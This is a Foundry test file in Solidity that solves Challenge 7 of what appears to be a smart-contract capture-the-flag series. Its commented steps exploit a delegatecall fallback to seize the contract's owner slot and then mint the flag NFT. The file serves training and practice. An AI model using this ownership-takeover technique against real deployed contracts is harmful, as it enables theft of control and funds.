// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

import {console} from "forge-std/Test.sol";
import {BaseTest} from "../BaseTest.sol";
import {Challenge7, Challenge7Delegate} from "../../../src/season1/Challenge7.sol";
import {NFTFlags} from "../../../src/season1/NFTFlags.sol";

contract Challenge7Test is BaseTest {
    Challenge7 challenge7;

    function setUp() public {
        setUpChallenges();

        vm.startPrank(ADMIN);

        Challenge7Delegate delegate = new Challenge7Delegate(ADMIN);

        challenge7 = new Challenge7(address(nftFlags), address(delegate), ADMIN);
        nftFlags.addAllowedMinter(address(challenge7));

        vm.stopPrank();
    }

    function test_challenge7() public {
        vm.startPrank(PLAYER, PLAYER);

        // Step 1: Call claimOwnership
        // Because Challenge7 does not have an implementation for claimOwnership, it will call the delegate
        // Then, the delegate will set the `owner`, but because of delegatecall, it will set the `owner` of the Challenge7 contract
        address(challenge7).call(abi.encodeWithSignature("claimOwnership()"));
        assertTrue(challenge7.owner() == PLAYER);

        // Step 2: Call mintFlag
        challenge7.mintFlag();

        // DONE: You should have obtained the flag for challenge #7
        assertTrue(nftFlags.hasMinted(PLAYER, 7));
    }
}
